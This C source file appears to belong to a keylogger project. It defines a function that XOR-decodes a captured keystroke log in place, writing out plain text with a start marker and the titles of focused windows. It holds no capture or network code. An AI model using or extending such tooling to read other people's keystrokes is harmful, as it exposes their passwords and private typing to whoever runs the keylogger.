#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "types.h"
#include "kld/error.h"
#include "kld/kld.h"

int KLD_Decode(char* fname)
{
	FILE *f = fopen(fname, "rb");

	if(!f)
	{
		return KLD_ERROR_OPEN;
	}

	fseek(f, 0, SEEK_END);
	uint32 fsize = ftell(f);
	fseek(f, 0, SEEK_SET);

	uint8 *data = malloc(fsize + sizeof(uint8));
	memset(data, 0, fsize);

	if(!fread(data, 1, fsize, f))
	{
		free(data);
		fclose(f);

		return KLD_ERROR_READ;
	}

	fclose(f);

	if(remove(fname) < 0)
	{
		free(data);

		return KLD_ERROR_REMOVE;
	}

	f = fopen(fname, "w");

	if(!f)
	{
		free(data);
		
		return KLD_ERROR_CREATE;
	}

	uint32 i;
	
	for(i = 0; i != fsize; i++)
	{
		if((data[i] ^ KLD_XOR_KEY) == KEY_DATA_CMD_STARTED)
		{
			fprintf(f, "\n{KEYLOGGER STARTED}\n\n");
		}else if((data[i] ^ KLD_XOR_KEY) == KEY_DATA_CMD_FOCUSWIN){
			if(i + 1 < fsize - 1)
			{
				int y;
				int size = data[i + 1] ^ KLD_XOR_KEY;

				i += 2;

				if(i + size > fsize - 1)
				{
					continue;
				}

				fprintf(f, "\n{");

				for(y = 0; y != size; y++)
				{
					fputc(data[i + y] ^ KLD_XOR_KEY, f);
				}

				fprintf(f, "}\n\n");

				i += size;
			}
		}else{
			fputc(data[i] ^ KLD_XOR_KEY, f);
		}
	}

	free(data);
	fclose(f);

	return KLD_NO_ERROR;
}